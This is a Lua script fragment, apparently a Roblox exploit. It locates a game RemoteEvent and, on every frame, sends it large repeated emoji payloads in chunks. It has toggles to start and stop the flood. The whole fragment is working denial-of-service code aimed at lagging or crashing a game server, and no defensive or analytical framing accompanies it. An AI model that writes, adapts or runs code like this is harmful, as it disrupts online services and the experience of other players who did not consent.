getRemoteFromPath = function(path)
    local parts = {}
    for part in string.gmatch(path, "[^%.]+") do
        table.insert(parts, part)
    end
    local current = ReplicatedStorage
    for _, part in ipairs(parts) do
        if current then
            current = current:FindFirstChild(part)
        else
            break
        end
    end
    return current and current:IsA("RemoteEvent") and current or nil
end
generateChunks = function(size, count)
    if Config.cachedChunks and Config.cachedSize == size and Config.cachedCount == count then
        return Config.cachedChunks
    end

    local base = "❤️❤️❤️❤️❤️😘😘😘😘😍😍😍😍❤️❤️❤️❤️❤️😘😘😘😘😍😍😍😍❤️❤️❤️❤️❤️😘😘😘😘😍😍😍😍❤️❤❤"
    local longBase = string.rep(base, 50)

    local chunkLen = math.max(1, math.floor(size / count))
    local chunks = {}

    for i = 1, count do
        local repeatCount = math.max(1, math.floor(chunkLen / #longBase))
        local chunk = string.rep(longBase, repeatCount):sub(1, chunkLen)
        chunks[i] = chunk
        if i % 100 == 0 then
            task.wait()
        end
    end

    Config.cachedChunks = chunks
    Config.cachedSize = size
    Config.cachedCount = count
    return chunks
end

startSpam = function()
    if Config.SpamPacket then return end
    local remote = getRemoteFromPath(remotePath)
    if not remote then
        return
    end
    Config.SpamPacket = true
    local chunks = generateChunks(Config.packetSize, Config.PacketsplitCount)
    local index = 1
    Config.spamPacketCon = service.RunService.Heartbeat:Connect(function()
        if not Config.SpamPacket then return end
        if Config.cachedSize ~= Config.packetSize or Config.cachedCount ~= Config.PacketsplitCount then
            chunks = generateChunks(Config.packetSize, Config.PacketsplitCount)
            index = 1
        end
        for _ = 1, Config.packetsPerFrame do
            if index > Config.PacketsplitCount then index = 1 end
            local payload = chunks[index]
            pcall(function() remote:FireServer(payload) end)
            index += 1
        end
    end)
end

stopSpam = function()
    if not Config.SpamPacket then return end
    Config.SpamPacket = false
    if Config.spamPacketCon then
        Config.spamPacketCon:Disconnect()
        Config.spamPacketCon = nil
    end
    Config.cachedChunks = nil
    Config.cachedSize = nil
    Config.cachedCount = nil
end
